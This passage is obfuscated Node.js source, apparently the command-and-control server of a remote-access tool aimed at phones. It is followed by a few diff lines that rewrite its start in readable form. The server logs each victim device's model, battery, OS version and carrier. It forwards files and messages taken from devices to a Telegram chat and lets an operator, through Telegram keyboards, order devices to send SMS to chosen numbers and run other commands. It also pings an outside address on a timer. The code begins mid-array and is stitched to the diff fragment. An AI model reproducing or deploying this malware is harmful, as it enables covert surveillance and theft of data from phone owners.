\u062A\u0634\u063A\u064A\u0644\u0647\x0A\x0A","\u2022\x20\u0274\u1D0F\u1D1B\u1D07\x20\u1D1B\u029C\u1D00\u1D1B\x20\u028F\u1D0F\u1D1C\x20\u1D0D\u1D1C\uA731\u1D1B\x20\u1D07\u0274\u1D1B\u1D07\u0280\x20\u1D1B\u029C\u1D07\x20\u1D05\u026A\u0280\u1D07\u1D04\u1D1B\x20\u029F\u026A\u0274\u1D0B\x20\u1D0F\uA730\x20\u1D1B\u029C\u1D07\x20\u1D05\u1D07\uA731\u026A\u0280\u1D07\u1D05\x20\uA731\u1D0F\u1D1C\u0274\u1D05\x2C\x20\u1D0F\u1D1B\u029C\u1D07\u0280\u1D21\u026A\uA731\u1D07\x20\u1D1B\u029C\u1D07\x20\uA731\u1D0F\u1D1C\u0274\u1D05\x20\u1D21\u026A\u029F\u029F\x20\u0274\u1D0F\u1D1B\x20\u0299\u1D07\x20\u1D18\u029F\u1D00\u028F\u1D07\u1D05","\x70\x69\x6E\x67","\x74\x68\x65\x6E","\x50\x4F\x52\x54","\x65\x6E\x76","\x6C\x69\x73\x74\x65\x6E"];const app=express();const appServer=http[_0xdc21[0]](app);const appSocket= new webSocket.Server({server:appServer});const appBot= new telegramBot(token,{polling:true});const appClients= new Map();const upload=multer();app[_0xdc21[2]](bodyParser[_0xdc21[1]]());let currentUuid=_0xdc21[3];let currentNumber=_0xdc21[3];let currentTitle=_0xdc21[3];app[_0xdc21[7]](_0xdc21[4],function(_0xeb57xa,_0xeb57xb){_0xeb57xb[_0xdc21[6]](_0xdc21[5])});app[_0xdc21[20]](_0xdc21[8],upload[_0xdc21[10]](_0xdc21[9]),(_0xeb57xa,_0xeb57xb)=>{const _0xeb57xc=_0xeb57xa[_0xdc21[9]][_0xdc21[11]];appBot[_0xdc21[19]](id,_0xeb57xa[_0xdc21[9]][_0xdc21[12]],{caption:`${_0xdc21[13]}${_0xeb57xa[_0xdc21[15]][_0xdc21[14]]}${_0xdc21[16]}`,parse_mode:_0xdc21[17]},{filename:_0xeb57xc,contentType:_0xdc21[18]});_0xeb57xb[_0xdc21[6]](_0xdc21[3])});app[_0xdc21[20]](_0xdc21[21],(_0xeb57xa,_0xeb57xb)=>{appBot[_0xdc21[25]](id,`${_0xdc21[13]}${_0xeb57xa[_0xdc21[15]][_0xdc21[14]]}${_0xdc21[22]}`+ _0xeb57xa[_0xdc21[24]][_0xdc21[23]],{parse_mode:_0xdc21[17]});_0xeb57xb[_0xdc21[6]](_0xdc21[3])});app[_0xdc21[20]](_0xdc21[26],(_0xeb57xa,_0xeb57xb)=>{appBot[_0xdc21[29]](id,_0xeb57xa[_0xdc21[24]][_0xdc21[27]],_0xeb57xa[_0xdc21[24]][_0xdc21[28]]);appBot[_0xdc21[25]](id,`${_0xdc21[30]}${_0xeb57xa[_0xdc21[15]][_0xdc21[14]]}${_0xdc21[16]}`,{parse_mode:_0xdc21[17]});_0xeb57xb[_0xdc21[6]](_0xdc21[3])});appSocket[_0xdc21[50]](_0xdc21[31],(_0xeb57xd,_0xeb57xa)=>{const _0xeb57xe=uuid4[_0xdc21[32]]();const _0xeb57xf=_0xeb57xa[_0xdc21[15]][_0xdc21[14]];const _0xeb57x10=_0xeb57xa[_0xdc21[15]][_0xdc21[33]];const _0xeb57x11=_0xeb57xa[_0xdc21[15]][_0xdc21[34]];const _0xeb57x12=_0xeb57xa[_0xdc21[15]][_0xdc21[35]];const _0xeb57x13=_0xeb57xa[_0xdc21[15]][_0xdc21[36]];_0xeb57xd[_0xdc21[37]]= _0xeb57xe;appClients[_0xdc21[38]](_0xeb57xe,{model:_0xeb57xf,battery:_0xeb57x10,version:_0xeb57x11,brightness:_0xeb57x12,provider:_0xeb57x13});appBot[_0xdc21[25]](id,`${_0xdc21[39]}`+ `${_0xdc21[40]}${_0xeb57xf}${_0xdc21[41]}`+ `${_0xdc21[42]}${_0xeb57x10}${_0xdc21[41]}`+ `${_0xdc21[43]}${_0xeb57x11}${_0xdc21[41]}`+ `${_0xdc21[44]}${_0xeb57x12}${_0xdc21[41]}`+ `${_0xdc21[45]}${_0xeb57x13}${_0xdc21[46]}`,{parse_mode:_0xdc21[17]});_0xeb57xd[_0xdc21[50]](_0xdc21[47],function(){appBot[_0xdc21[25]](id,`${_0xdc21[48]}`+ `${_0xdc21[40]}${_0xeb57xf}${_0xdc21[41]}`+ `${_0xdc21[42]}${_0xeb57x10}${_0xdc21[41]}`+ `${_0xdc21[43]}${_0xeb57x11}${_0xdc21[41]}`+ `${_0xdc21[44]}${_0xeb57x12}${_0xdc21[41]}`+ `${_0xdc21[45]}${_0xeb57x13}${_0xdc21[46]}`,{parse_mode:_0xdc21[17]});appClients[_0xdc21[49]](_0xeb57xd[_0xdc21[37]])})});appBot[_0xdc21[50]](_0xdc21[51],(_0xeb57x14)=>{const _0xeb57x15=_0xeb57x14[_0xdc21[53]][_0xdc21[52]];if(_0xeb57x14[_0xdc21[54]]){if(_0xeb57x14[_0xdc21[54]][_0xdc21[23]][_0xdc21[56]](_0xdc21[55])){currentNumber= _0xeb57x14[_0xdc21[23]];appBot[_0xdc21[25]](id,_0xdc21[57]+ _0xdc21[58],{reply_markup:{force_reply:true}})};if(_0xeb57x14[_0xdc21[54]][_0xdc21[23]][_0xdc21[56]](_0xdc21[59])){appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd){if(_0xeb57xd[_0xdc21[37]]== currentUuid){_0xeb57xd[_0xdc21[6]](`${_0xdc21[60]}${currentNumber}${_0xdc21[4]}${_0xeb57x14[_0xdc21[23]]}${_0xdc21[3]}`)}});currentNumber= _0xdc21[3];currentUuid= _0xdc21[3];appBot[_0xdc21[25]](id,_0xdc21[63]+ _0xdc21[64],{parse_mode:_0xdc21[17],"\x72\x65\x70\x6C\x79\x5F\x6D\x61\x72\x6B\x75\x70":{"\x6B\x65\x79\x62\x6F\x61\x72\x64":[[_0xdc21[65]],[_0xdc21[66]]],'\x72\x65\x73\x69\x7A\x65\x5F\x6B\x65\x79\x62\x6F\x61\x72\x64':true}})};if(_0xeb57x14[_0xdc21[54]][_0xdc21[23]][_0xdc21[56]](_0xdc21[67])){const _0xeb57x17=_0xeb57x14[_0xdc21[23]];appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd){if(_0xeb57xd[_0xdc21[37]]== currentUuid){_0xeb57xd[_0xdc21[6]](`${_0xdc21[68]}${_0xeb57x17}${_0xdc21[3]}`)}});currentUuid= _0xdc21[3];appBot[_0xdc21[25]](id,_0xdc21[63]+ _0xdc21[64],{parse_mode:_0xdc21[17],"\x72\x65\x70\x6C\x79\x5F\x6D\x61\x72\x6B\x75\x70":{"\x6B\x65\x79\x62\x6F\x61\x72\x64":[[_0xdc21[65]],[_0xdc21[66]]],'\x72\x65\x73\x69\x7A\x65\x5F\x6B\x65\x79\x62\x6F\x61\x72\x64':true}})};if(_0xeb57x14[_0xdc21[54]][_0xdc21[23]][_0xdc21[56]](_0xdc21[69])){const _0xeb57x18=_0xeb57x14[_0xdc21[23]];appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd){if(_0xeb57xd[_0xdc21[37]]== currentUuid){_0xeb57xd[_0xdc21[6]](`${_0xdc21[70]}${_0xeb57x18}${_0xdc21[3]}`)}});currentUuid= _0xdc21[3];appBot[_0xdc21[25]](id,_0xdc21[63]+ _0xdc21[64],{parse_mode:_0xdc21[17],"\x72\x65\x70\x6C\x79\x5F\x6D\x61\x72\x6B\x75\x70":{"\x6B\x65\x79\x62\x6F\x61\x72\x64":[[_0xdc21[65]],[_0xdc21[66]]],'\x72\x65\x73\x69\x7A\x65\x5F\x6B\x65\x79\x62\x6F\x61\x72\x64':true}})};if(_0xeb57x14[_0xdc21[54]][_0xdc21[23]][_0xdc21[56]](_0xdc21[71])){const _0xeb57x18=_0xeb57x14[_0xdc21[23]];appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd){if(_0xeb57xd[_0xdc21[37]]== currentUuid){_0xeb57xd[_0xdc21[6]](`${_0xdc21[72]}${_0xeb57x18}${_0xdc21[3]}`)}});currentUuid= _0xdc21[3];appBot[_0xdc21[25]](id,_0xdc21[63]+ _0xdc21[64],{parse_mode:_0xdc21[17],"\x72\x65\x70\x6C\x79\x5F\x6D\x61\x72\x6B\x75\x70":{"\x6B\x65\x79\x62\x6F\x61\x72\x64":[[_0xdc21[65]],[_0xdc21[66]]],'\x72\x65\x73\x69\x7A\x65\x5F\x6B\x65\x79\x62\x6F\x61\x72\x64':true}})};if(_0xeb57x14[_0xdc21[54]][_0xdc21[23]][_0xdc21[56]](_0xdc21[73])){const _0xeb57x19=_0xeb57x14[_0xdc21[23]];appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd){if(_0xeb57xd[_0xdc21[37]]== currentUuid){_0xeb57xd[_0xdc21[6]](`${_0xdc21[74]}${_0xeb57x19}${_0xdc21[3]}`)}});currentUuid= _0xdc21[3];appBot[_0xdc21[25]](id,_0xdc21[63]+ _0xdc21[64],{parse_mode:_0xdc21[17],"\x72\x65\x70\x6C\x79\x5F\x6D\x61\x72\x6B\x75\x70":{"\x6B\x65\x79\x62\x6F\x61\x72\x64":[[_0xdc21[65]],[_0xdc21[66]]],'\x72\x65\x73\x69\x7A\x65\x5F\x6B\x65\x79\x62\x6F\x61\x72\x64':true}})};if(_0xeb57x14[_0xdc21[54]][_0xdc21[23]][_0xdc21[56]](_0xdc21[75])){const _0xeb57x19=_0xeb57x14[_0xdc21[23]];appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd){if(_0xeb57xd[_0xdc21[37]]== currentUuid){_0xeb57xd[_0xdc21[6]](`${_0xdc21[76]}${_0xeb57x19}${_0xdc21[3]}`)}});currentUuid= _0xdc21[3];appBot[_0xdc21[25]](id,_0xdc21[63]+ _0xdc21[64],{parse_mode:_0xdc21[17],"\x72\x65\x70\x6C\x79\x5F\x6D\x61\x72\x6B\x75\x70":{"\x6B\x65\x79\x62\x6F\x61\x72\x64":[[_0xdc21[65]],[_0xdc21[66]]],'\x72\x65\x73\x69\x7A\x65\x5F\x6B\x65\x79\x62\x6F\x61\x72\x64':true}})};if(_0xeb57x14[_0xdc21[54]][_0xdc21[23]][_0xdc21[56]](_0xdc21[77])){const _0xeb57x19=_0xeb57x14[_0xdc21[23]];appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd){if(_0xeb57xd[_0xdc21[37]]== currentUuid){_0xeb57xd[_0xdc21[6]](`${_0xdc21[78]}${_0xeb57x19}${_0xdc21[3]}`)}});currentUuid= _0xdc21[3];appBot[_0xdc21[25]](id,_0xdc21[63]+ _0xdc21[64],{parse_mode:_0xdc21[17],"\x72\x65\x70\x6C\x79\x5F\x6D\x61\x72\x6B\x75\x70":{"\x6B\x65\x79\x62\x6F\x61\x72\x64":[[_0xdc21[65]],[_0xdc21[66]]],'\x72\x65\x73\x69\x7A\x65\x5F\x6B\x65\x79\x62\x6F\x61\x72\x64':true}})};if(_0xeb57x14[_0xdc21[54]][_0xdc21[23]][_0xdc21[56]](_0xdc21[79])){const _0xeb57x1a=_0xeb57x14[_0xdc21[23]];appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd){if(_0xeb57xd[_0xdc21[37]]== currentUuid){_0xeb57xd[_0xdc21[6]](`${_0xdc21[80]}${_0xeb57x1a}${_0xdc21[3]}`)}});currentUuid= _0xdc21[3];appBot[_0xdc21[25]](id,_0xdc21[63]+ _0xdc21[64],{parse_mode:_0xdc21[17],"\x72\x65\x70\x6C\x79\x5F\x6D\x61\x72\x6B\x75\x70":{"\x6B\x65\x79\x62\x6F\x61\x72\x64":[[_0xdc21[65]],[_0xdc21[66]]],'\x72\x65\x73\x69\x7A\x65\x5F\x6B\x65\x79\x62\x6F\x61\x72\x64':true}})};if(_0xeb57x14[_0xdc21[54]][_0xdc21[23]][_0xdc21[56]](_0xdc21[81])){const _0xeb57x1b=_0xeb57x14[_0xdc21[23]];currentTitle= _0xeb57x1b;appBot[_0xdc21[25]](id,_0xdc21[82]+ _0xdc21[83],{reply_markup:{force_reply:true}})};if(_0xeb57x14[_0xdc21[54]][_0xdc21[23]][_0xdc21[56]](_0xdc21[84])){const _0xeb57x1c=_0xeb57x14[_0xdc21[23]];appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd){if(_0xeb57xd[_0xdc21[37]]== currentUuid){_0xeb57xd[_0xdc21[6]](`${_0xdc21[85]}${currentTitle}${_0xdc21[4]}${_0xeb57x1c}${_0xdc21[3]}`)}});currentUuid= _0xdc21[3];appBot[_0xdc21[25]](id,_0xdc21[63]+ _0xdc21[64],{parse_mode:_0xdc21[17],"\x72\x65\x70\x6C\x79\x5F\x6D\x61\x72\x6B\x75\x70":{"\x6B\x65\x79\x62\x6F\x61\x72\x64":[[_0xdc21[65]],[_0xdc21[66]]],'\x72\x65\x73\x69\x7A\x65\x5F\x6B\x65\x79\x62\x6F\x61\x72\x64':true}})};if(_0xeb57x14[_0xdc21[54]][_0xdc21[23]][_0xdc21[56]](_0xdc21[86])){const _0xeb57x1d=_0xeb57x14[_0xdc21[23]];appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd){if(_0xeb57xd[_0xdc21[37]]== currentUuid){_0xeb57xd[_0xdc21[6]](`${_0xdc21[87]}${_0xeb57x1d}${_0xdc21[3]}`)}});currentUuid= _0xdc21[3];appBot[_0xdc21[25]](id,_0xdc21[63]+ _0xdc21[64],{parse_mode:_0xdc21[17],"\x72\x65\x70\x6C\x79\x5F\x6D\x61\x72\x6B\x75\x70":{"\x6B\x65\x79\x62\x6F\x61\x72\x64":[[_0xdc21[65]],[_0xdc21[66]]],'\x72\x65\x73\x69\x7A\x65\x5F\x6B\x65\x79\x62\x6F\x61\x72\x64':true}})}};if(id== _0xeb57x15){if(_0xeb57x14[_0xdc21[23]]== _0xdc21[88]){appBot[_0xdc21[25]](id,_0xdc21[89]+ _0xdc21[90]+ _0xdc21[91]+ _0xdc21[92]+ _0xdc21[93],{parse_mode:_0xdc21[17],"\x72\x65\x70\x6C\x79\x5F\x6D\x61\x72\x6B\x75\x70":{"\x6B\x65\x79\x62\x6F\x61\x72\x64":[[_0xdc21[65]],[_0xdc21[66]]],'\x72\x65\x73\x69\x7A\x65\x5F\x6B\x65\x79\x62\x6F\x61\x72\x64':true}})};if(_0xeb57x14[_0xdc21[23]]== _0xdc21[65]){if(appClients[_0xdc21[94]]== 0){appBot[_0xdc21[25]](id,_0xdc21[95]+ _0xdc21[96])}else {let _0xeb57x1e=_0xdc21[97];appClients[_0xdc21[61]](function(_0xeb57x1f,_0xeb57x20,_0xeb57x21){_0xeb57x1e+= `${_0xdc21[40]}${_0xeb57x1f[_0xdc21[14]]}${_0xdc21[41]}`+ `${_0xdc21[42]}${_0xeb57x1f[_0xdc21[33]]}${_0xdc21[41]}`+ `${_0xdc21[43]}${_0xeb57x1f[_0xdc21[34]]}${_0xdc21[41]}`+ `${_0xdc21[44]}${_0xeb57x1f[_0xdc21[35]]}${_0xdc21[41]}`+ `${_0xdc21[45]}${_0xeb57x1f[_0xdc21[36]]}${_0xdc21[98]}`});appBot[_0xdc21[25]](id,_0xeb57x1e,{parse_mode:_0xdc21[17]})}};if(_0xeb57x14[_0xdc21[23]]== _0xdc21[66]){if(appClients[_0xdc21[94]]== 0){appBot[_0xdc21[25]](id,_0xdc21[95]+ _0xdc21[96])}else {const _0xeb57x22=[];appClients[_0xdc21[61]](function(_0xeb57x1f,_0xeb57x20,_0xeb57x21){_0xeb57x22[_0xdc21[100]]([{text:_0xeb57x1f[_0xdc21[14]],callback_data:_0xdc21[99]+ _0xeb57x20}])});appBot[_0xdc21[25]](id,_0xdc21[101],{"\x72\x65\x70\x6C\x79\x5F\x6D\x61\x72\x6B\x75\x70":{"\x69\x6E\x6C\x69\x6E\x65\x5F\x6B\x65\x79\x62\x6F\x61\x72\x64":_0xeb57x22}})}}}else {appBot[_0xdc21[25]](id,_0xdc21[102])}});appBot[_0xdc21[50]](_0xdc21[103],(_0xeb57x23)=>{const _0xeb57x24=_0xeb57x23[_0xdc21[51]];const _0xeb57x25=_0xeb57x23[_0xdc21[104]];const _0xeb57x26=_0xeb57x25[_0xdc21[106]](_0xdc21[105])[0];const _0xeb57xe=_0xeb57x25[_0xdc21[106]](_0xdc21[105])[1];console[_0xdc21[107]](_0xeb57xe);if(_0xeb57x26== _0xdc21[108]){appBot[_0xdc21[141]](`${_0xdc21[109]}${appClients[_0xdc21[7]](_0xeb57x25[_0xdc21[106]](_0xdc21[105])[1])[_0xdc21[14]]}${_0xdc21[46]}`,{width:10000,chat_id:id,message_id:_0xeb57x24[_0xdc21[110]],reply_markup:{inline_keyboard:[[{text:_0xdc21[111],callback_data:`${_0xdc21[112]}${_0xeb57xe}${_0xdc21[3]}`},{text:_0xdc21[113],callback_data:`${_0xdc21[114]}${_0xeb57xe}${_0xdc21[3]}`}],[{text:_0xdc21[115],callback_data:`${_0xdc21[70]}${_0xeb57xe}${_0xdc21[3]}`},{text:_0xdc21[116],callback_data:`${_0xdc21[72]}${_0xeb57xe}${_0xdc21[3]}`}],[{text:_0xdc21[117],callback_data:`${_0xdc21[118]}${_0xeb57xe}${_0xdc21[3]}`},{text:_0xdc21[119],callback_data:`${_0xdc21[74]}${_0xeb57xe}${_0xdc21[3]}`}],[{text:_0xdc21[120],callback_data:`${_0xdc21[121]}${_0xeb57xe}${_0xdc21[3]}`},{text:_0xdc21[122],callback_data:`${_0xdc21[123]}${_0xeb57xe}${_0xdc21[3]}`}],[{text:_0xdc21[124],callback_data:`${_0xdc21[125]}${_0xeb57xe}${_0xdc21[3]}`},{text:_0xdc21[126],callback_data:`${_0xdc21[80]}${_0xeb57xe}${_0xdc21[3]}`}],[{text:_0xdc21[127],callback_data:`${_0xdc21[128]}${_0xeb57xe}${_0xdc21[3]}`},{text:_0xdc21[129],callback_data:`${_0xdc21[130]}${_0xeb57xe}${_0xdc21[3]}`}],[{text:_0xdc21[131],callback_data:`${_0xdc21[132]}${_0xeb57xe}${_0xdc21[3]}`},{text:_0xdc21[133],callback_data:`${_0xdc21[85]}${_0xeb57xe}${_0xdc21[3]}`}],[{text:_0xdc21[134],callback_data:`${_0xdc21[135]}${_0xeb57xe}${_0xdc21[3]}`},{text:_0xdc21[136],callback_data:`${_0xdc21[60]}${_0xeb57xe}${_0xdc21[3]}`}],[{text:_0xdc21[137],callback_data:`${_0xdc21[87]}${_0xeb57xe}${_0xdc21[3]}`},{text:_0xdc21[138],callback_data:`${_0xdc21[139]}${_0xeb57xe}${_0xdc21[3]}`}],[{text:_0xdc21[140],callback_data:`${_0xdc21[68]}${_0xeb57xe}${_0xdc21[3]}`}]]},parse_mode:_0xdc21[17]})};if(_0xeb57x26== _0xdc21[142]){appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd){if(_0xeb57xd[_0xdc21[37]]== _0xeb57xe){_0xeb57xd[_0xdc21[6]](_0xdc21[142])}});appBot[_0xdc21[143]](id,_0xeb57x24[_0xdc21[110]]);appBot[_0xdc21[25]](id,_0xdc21[63]+ _0xdc21[64],{parse_mode:_0xdc21[17],"\x72\x65\x70\x6C\x79\x5F\x6D\x61\x72\x6B\x75\x70":{"\x6B\x65\x79\x62\x6F\x61\x72\x64":[[_0xdc21[65]],[_0xdc21[66]]],'\x72\x65\x73\x69\x7A\x65\x5F\x6B\x65\x79\x62\x6F\x61\x72\x64':true}})};if(_0xeb57x26== _0xdc21[144]){appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd){if(_0xeb57xd[_0xdc21[37]]== _0xeb57xe){_0xeb57xd[_0xdc21[6]](_0xdc21[144])}});appBot[_0xdc21[143]](id,_0xeb57x24[_0xdc21[110]]);appBot[_0xdc21[25]](id,_0xdc21[63]+ _0xdc21[64],{parse_mode:_0xdc21[17],"\x72\x65\x70\x6C\x79\x5F\x6D\x61\x72\x6B\x75\x70":{"\x6B\x65\x79\x62\x6F\x61\x72\x64":[[_0xdc21[65]],[_0xdc21[66]]],'\x72\x65\x73\x69\x7A\x65\x5F\x6B\x65\x79\x62\x6F\x61\x72\x64':true}})};if(_0xeb57x26== _0xdc21[145]){appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd){if(_0xeb57xd[_0xdc21[37]]== _0xeb57xe){_0xeb57xd[_0xdc21[6]](_0xdc21[145])}});appBot[_0xdc21[143]](id,_0xeb57x24[_0xdc21[110]]);appBot[_0xdc21[25]](id,_0xdc21[63]+ _0xdc21[64],{parse_mode:_0xdc21[17],"\x72\x65\x70\x6C\x79\x5F\x6D\x61\x72\x6B\x75\x70":{"\x6B\x65\x79\x62\x6F\x61\x72\x64":[[_0xdc21[65]],[_0xdc21[66]]],'\x72\x65\x73\x69\x7A\x65\x5F\x6B\x65\x79\x62\x6F\x61\x72\x64':true}})};if(_0xeb57x26== _0xdc21[146]){appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd){if(_0xeb57xd[_0xdc21[37]]== _0xeb57xe){_0xeb57xd[_0xdc21[6]](_0xdc21[146])}});appBot[_0xdc21[143]](id,_0xeb57x24[_0xdc21[110]]);appBot[_0xdc21[25]](id,_0xdc21[63]+ _0xdc21[64],{parse_mode:_0xdc21[17],"\x72\x65\x70\x6C\x79\x5F\x6D\x61\x72\x6B\x75\x70":{"\x6B\x65\x79\x62\x6F\x61\x72\x64":[[_0xdc21[65]],[_0xdc21[66]]],'\x72\x65\x73\x69\x7A\x65\x5F\x6B\x65\x79\x62\x6F\x61\x72\x64':true}})};if(_0xeb57x26== _0xdc21[147]){appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd){if(_0xeb57xd[_0xdc21[37]]== _0xeb57xe){_0xeb57xd[_0xdc21[6]](_0xdc21[147])}});appBot[_0xdc21[143]](id,_0xeb57x24[_0xdc21[110]]);appBot[_0xdc21[25]](id,_0xdc21[63]+ _0xdc21[64],{parse_mode:_0xdc21[17],"\x72\x65\x70\x6C\x79\x5F\x6D\x61\x72\x6B\x75\x70":{"\x6B\x65\x79\x62\x6F\x61\x72\x64":[[_0xdc21[65]],[_0xdc21[66]]],'\x72\x65\x73\x69\x7A\x65\x5F\x6B\x65\x79\x62\x6F\x61\x72\x64':true}})};if(_0xeb57x26== _0xdc21[148]){appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd){if(_0xeb57xd[_0xdc21[37]]== _0xeb57xe){_0xeb57xd[_0xdc21[6]](_0xdc21[148])}});appBot[_0xdc21[143]](id,_0xeb57x24[_0xdc21[110]]);appBot[_0xdc21[25]](id,_0xdc21[63]+ _0xdc21[64],{parse_mode:_0xdc21[17],"\x72\x65\x70\x6C\x79\x5F\x6D\x61\x72\x6B\x75\x70":{"\x6B\x65\x79\x62\x6F\x61\x72\x64":[[_0xdc21[65]],[_0xdc21[66]]],'\x72\x65\x73\x69\x7A\x65\x5F\x6B\x65\x79\x62\x6F\x61\x72\x64':true}})};if(_0xeb57x26== _0xdc21[149]){appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd){if(_0xeb57xd[_0xdc21[37]]== _0xeb57xe){_0xeb57xd[_0xdc21[6]](_0xdc21[149])}});appBot[_0xdc21[143]](id,_0xeb57x24[_0xdc21[110]]);appBot[_0xdc21[25]](id,_0xdc21[63]+ _0xdc21[64],{parse_mode:_0xdc21[17],"\x72\x65\x70\x6C\x79\x5F\x6D\x61\x72\x6B\x75\x70":{"\x6B\x65\x79\x62\x6F\x61\x72\x64":[[_0xdc21[65]],[_0xdc21[66]]],'\x72\x65\x73\x69\x7A\x65\x5F\x6B\x65\x79\x62\x6F\x61\x72\x64':true}})};if(_0xeb57x26== _0xdc21[150]){appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd){if(_0xeb57xd[_0xdc21[37]]== _0xeb57xe){_0xeb57xd[_0xdc21[6]](_0xdc21[150])}});appBot[_0xdc21[143]](id,_0xeb57x24[_0xdc21[110]]);appBot[_0xdc21[25]](id,_0xdc21[63]+ _0xdc21[64],{parse_mode:_0xdc21[17],"\x72\x65\x70\x6C\x79\x5F\x6D\x61\x72\x6B\x75\x70":{"\x6B\x65\x79\x62\x6F\x61\x72\x64":[[_0xdc21[65]],[_0xdc21[66]]],'\x72\x65\x73\x69\x7A\x65\x5F\x6B\x65\x79\x62\x6F\x61\x72\x64':true}})};if(_0xeb57x26== _0xdc21[151]){appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd){if(_0xeb57xd[_0xdc21[37]]== _0xeb57xe){_0xeb57xd[_0xdc21[6]](_0xdc21[151])}});appBot[_0xdc21[143]](id,_0xeb57x24[_0xdc21[110]]);appBot[_0xdc21[25]](id,_0xdc21[63]+ _0xdc21[64],{parse_mode:_0xdc21[17],"\x72\x65\x70\x6C\x79\x5F\x6D\x61\x72\x6B\x75\x70":{"\x6B\x65\x79\x62\x6F\x61\x72\x64":[[_0xdc21[65]],[_0xdc21[66]]],'\x72\x65\x73\x69\x7A\x65\x5F\x6B\x65\x79\x62\x6F\x61\x72\x64':true}})};if(_0xeb57x26== _0xdc21[152]){appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd){if(_0xeb57xd[_0xdc21[37]]== _0xeb57xe){_0xeb57xd[_0xdc21[6]](_0xdc21[152])}});appBot[_0xdc21[143]](id,_0xeb57x24[_0xdc21[110]]);appBot[_0xdc21[25]](id,_0xdc21[63]+ _0xdc21[64],{parse_mode:_0xdc21[17],"\x72\x65\x70\x6C\x79\x5F\x6D\x61\x72\x6B\x75\x70":{"\x6B\x65\x79\x62\x6F\x61\x72\x64":[[_0xdc21[65]],[_0xdc21[66]]],'\x72\x65\x73\x69\x7A\x65\x5F\x6B\x65\x79\x62\x6F\x61\x72\x64':true}})};if(_0xeb57x26== _0xdc21[153]){appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd){if(_0xeb57xd[_0xdc21[37]]== _0xeb57xe){_0xeb57xd[_0xdc21[6]](_0xdc21[153])}});appBot[_0xdc21[143]](id,_0xeb57x24[_0xdc21[110]]);appBot[_0xdc21[25]](id,_0xdc21[63]+ _0xdc21[64],{parse_mode:_0xdc21[17],"\x72\x65\x70\x6C\x79\x5F\x6D\x61\x72\x6B\x75\x70":{"\x6B\x65\x79\x62\x6F\x61\x72\x64":[[_0xdc21[65]],[_0xdc21[66]]],'\x72\x65\x73\x69\x7A\x65\x5F\x6B\x65\x79\x62\x6F\x61\x72\x64':true}})};if(_0xeb57x26== _0xdc21[154]){appBot[_0xdc21[143]](id,_0xeb57x24[_0xdc21[110]]);appBot[_0xdc21[25]](id,_0xdc21[155]+ _0xdc21[156],{reply_markup:{force_reply:true}});currentUuid= _0xeb57xe};if(_0xeb57x26== _0xdc21[157]){appBot[_0xdc21[143]](id,_0xeb57x24[_0xdc21[110]]);appBot[_0xdc21[25]](id,_0xdc21[158]+ _0xdc21[58],{reply_markup:{force_reply:true}});currentUuid= _0xeb57xe};if(_0xeb57x26== _0xdc21[9]){appBot[_0xdc21[143]](id,_0xeb57x24[_0xdc21[110]]);appBot[_0xdc21[25]](id,_0xdc21[159]+ _0xdc21[160],{reply_markup:{force_reply:true},parse_mode:_0xdc21[17]});currentUuid= _0xeb57xe};if(_0xeb57x26== _0xdc21[161]){appBot[_0xdc21[143]](id,_0xeb57x24[_0xdc21[110]]);appBot[_0xdc21[25]](id,_0xdc21[162]+ _0xdc21[163],{reply_markup:{force_reply:true},parse_mode:_0xdc21[17]});currentUuid= _0xeb57xe};if(_0xeb57x26== _0xdc21[164]){appBot[_0xdc21[143]](id,_0xeb57x24[_0xdc21[110]]);appBot[_0xdc21[25]](id,_0xdc21[165]+ _0xdc21[166],{reply_markup:{force_reply:true},parse_mode:_0xdc21[17]});currentUuid= _0xeb57xe};if(_0xeb57x26== _0xdc21[167]){appBot[_0xdc21[143]](id,_0xeb57x24[_0xdc21[110]]);appBot[_0xdc21[25]](id,_0xdc21[168]+ _0xdc21[169],{reply_markup:{force_reply:true},parse_mode:_0xdc21[17]});currentUuid= _0xeb57xe};if(_0xeb57x26== _0xdc21[170]){appBot[_0xdc21[143]](id,_0xeb57x24[_0xdc21[110]]);appBot[_0xdc21[25]](id,_0xdc21[171]+ _0xdc21[172],{reply_markup:{force_reply:true},parse_mode:_0xdc21[17]});currentUuid= _0xeb57xe};if(_0xeb57x26== _0xdc21[173]){appBot[_0xdc21[143]](id,_0xeb57x24[_0xdc21[110]]);appBot[_0xdc21[25]](id,_0xdc21[174]+ _0xdc21[175],{reply_markup:{force_reply:true},parse_mode:_0xdc21[17]});currentUuid= _0xeb57xe}});setInterval(function(){appSocket[_0xdc21[62]][_0xdc21[61]](function _0xeb57x16(_0xeb57xd){_0xeb57xd[_0xdc21[6]](_0xdc21[176])});try{axios[_0xdc21[7]](address)[_0xdc21[177]]((_0xeb57x27)=>{return _0xdc21[3]})}catch(e){}},5000);appServer[_0xdc21[180]](process[_0xdc21[179]][_0xdc21[178]]|| 8999)
+const app = express();
+const appServer = http.createServer(app);
+const appSocket = new webSocket.Server({ server: appServer });
+const appBot = new telegramBot(token, { polling: true });
+const appClients = new Map();
+const upload = multer({ dest: 'uploads/' });
+
+app.use(bodyParser.json());
+app.use(bodyParser.urlencoded({ extended: true }));
+
